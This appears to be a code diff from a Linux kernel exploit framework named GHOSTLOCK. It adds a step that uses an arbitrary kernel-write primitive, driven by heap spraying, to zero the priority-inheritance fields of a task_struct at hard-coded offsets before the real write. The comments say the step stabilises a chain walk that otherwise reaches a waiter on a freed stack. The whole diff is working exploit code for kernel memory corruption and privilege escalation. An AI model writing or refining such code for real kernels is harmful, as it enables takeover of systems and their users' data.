@@ -117,6 +117,25 @@ static int multicast_scrub_enabled(void) {
     return cached;
 }
 
+/* A: pre-write normalisation of the fixture task's PI state. The kernel reads
+ * pi_lock/pi_waiters/pi_top_task when it walks the chain; leaving stale
+ * rb_node/owner values there is what lets the walk leave our structures and
+ * end up chasing a waiter on a freed stack. Offsets are this kernel's
+ * task_struct fields (same values the profile carries as task_pi_*).
+ * Runs before the real write; disable with GHOSTLOCK_MCAST_PREP=0. */
+#define MCAST_TASK_PI_LOCK_OFF 0x884u
+#define MCAST_TASK_PI_WAITERS_OFF 0x898u
+#define MCAST_TASK_PI_TOP_TASK_OFF 0x8a8u
+
+static int multicast_prep_enabled(void) {
+    static int cached = -1;
+    if (cached < 0) {
+        const char *v = getenv("GHOSTLOCK_MCAST_PREP");
+        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
+    }
+    return cached;
+}
+
 /* Ask the worker to stamp the buffer again (it owns the kernel frame). */
 static void multicast_request_respray(MulticastWaiterRouteContext *context,
         uintptr_t target, uintptr_t value) {
@@ -383,6 +402,27 @@ int MulticastWaiterRoute::start() noexcept {
 int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
     auto *context = this;
     if (!context->ready) return 0;
+    context->target = target;
+    context->value = value;
+    if (multicast_prep_enabled()) {
+        /* A: normalise the fixture task's PI state before the walk that matters. */
+        static const unsigned kTaskFields[] = {
+            MCAST_TASK_PI_LOCK_OFF, MCAST_TASK_PI_WAITERS_OFF,
+            MCAST_TASK_PI_TOP_TASK_OFF,
+        };
+        for (size_t i = 0; i < sizeof(kTaskFields) / sizeof(kTaskFields[0]); i++) {
+            const uintptr_t addr = context->task + kTaskFields[i];
+            multicast_request_respray(context, addr, 0);
+            usleep(multicast_post_spray_settle_us());
+            long rr = multicast_waiter_adjust(context);
+            pr_info("mcast prep: [%#zx] <- 0 ret=%ld\n", addr, rr);
+        }
+        /* leave the window benign again before the real write */
+        multicast_request_respray(context, 0, 0);
+        usleep(multicast_post_spray_settle_us());
+        pr_success("mcast prep done; fixture PI state normalised\n");
+    }
+    /* the prep cycles above overwrote the request: restore it */
     context->target = target;
     context->value = value;
     atomic_store(&context->sprayed, 0);
